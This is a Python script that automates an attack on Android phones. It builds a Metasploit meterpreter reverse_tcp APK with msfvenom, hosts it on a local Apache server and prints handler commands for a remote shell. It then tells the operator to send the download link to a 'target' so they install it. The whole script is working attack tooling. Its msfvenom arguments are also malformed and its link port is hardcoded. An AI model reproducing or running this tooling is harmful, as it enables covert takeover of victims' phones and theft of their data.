import subprocess, termcolor, time
from termcolor import colored
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
print(Fore.BLUE + "MSF-APK for android")
time.sleep(1)
print(Fore.CYAN + "[+]make your payload")

answer = input(Fore.YELLOW + "do you want to edit the apche2 ports.conf and apache2.conf file[y/n] ")
if answer == "y":
   print(Fore.YELLOW + "ok! editing file")
   time.sleep(1)
   subprocess.run('nano /etc/apache2/ports.conf', shell=True)
   subprocess.run('nano /etc/apache2/apache2.conf', shell=True)
   print(Style.BRIGHT + Fore.GREEN + "Saved!")
   time.sleep(1)
else:
    print(Style.BRIGHT + Fore.GREEN + "ok! saving file")

ip = str(input(Fore.RED + '[+] IP: '))
port = str(input(Fore.RED + '[+] PORT: '))
output_file = str(input(Fore.RED + '[+] OUTPUT FILE NAME: '))
print(Fore.BLUE + "now wait..")
subprocess.run('msfvenom -p android/meterpreter/reverse_tcp '+ip+' '+port+' -o /var/www/html/'+output_file, shell=True)
subprocess.run('service apache2 start', shell=True)
print(Style.BRIGHT + Fore.GREEN + "apache2 is running!")
time.sleep(0.2)
print("----------------------------------------------------------")
print(Fore.YELLOW + "now go in another terminal and start metasploit, And copy and paste what is printed below.")
print(Style.BRIGHT + Fore.RED + "use exploit/multi/handler")
print(Style.BRIGHT + Fore.RED + "set LHOST "+ip+"")
print(Style.BRIGHT + Fore.RED + "set LPORT "+port+"")
print(Style.BRIGHT + Fore.RED + "set payload android/meterpreter/reverse_tcp")
print(Style.BRIGHT + Fore.RED + "exploit")
print("----------------------------------------------------------")
print(Fore.YELLOW + "send this link: http://"+ip+":2222/"+output_file+" to target so they download it")
print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
subprocess.run('msfconsole -q', shell=True)
